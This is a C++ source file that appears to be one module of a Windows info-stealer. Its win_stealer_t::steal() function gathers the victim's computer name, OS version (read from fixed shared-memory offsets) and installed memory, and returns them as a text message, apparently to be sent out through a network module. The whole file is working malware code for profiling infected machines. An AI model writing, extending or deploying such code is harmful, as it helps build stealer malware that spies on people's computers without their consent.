#include "win_stealer.h"

#include "net.h"
#include "messages/text_message.h"

std::string pc_t::str() const
{
    std::stringstream ss;
    ss << "PC Name: " << name << "\n";
    ss << "OS Name: " << os << "\n";
    ss << "Total Memory: " << total_memory << "\n";
    return ss.str();
}

asio::awaitable<std::unique_ptr<message_t>> win_stealer_t::steal()
{
    return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [](auto completion_handler)
        {
            std::thread([](auto completion_handler)
            {
                pc_t pc;
                DWORD size = 1024;

                if (!GetComputerName(pc.name, &size))
                    DLOG("Cant get Computer Name");

                auto sharedUserData = (BYTE*)0x7FFE0000;
                sprintf_s(pc.os, "Windows %d.%d.%d",
                          *(ULONG*)(sharedUserData + 0x26c), // major version offset
                          *(ULONG*)(sharedUserData + 0x270), // minor version offset
                          *(ULONG*)(sharedUserData + 0x260)); // build number offset

                ULONGLONG mem;
                if (!GetPhysicallyInstalledSystemMemory(&mem))
                {
                    DLOG("Cant get Total Memory");
                    mem = 0;
                }
                sprintf_s(pc.total_memory, "%llu GB", mem / (1024 * 1024));

                auto to_ret = std::make_unique<text_message_t>();
                to_ret->text = pc.str();

                DLOG(to_ret->text);

                std::move(completion_handler)(std::move(to_ret));
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}
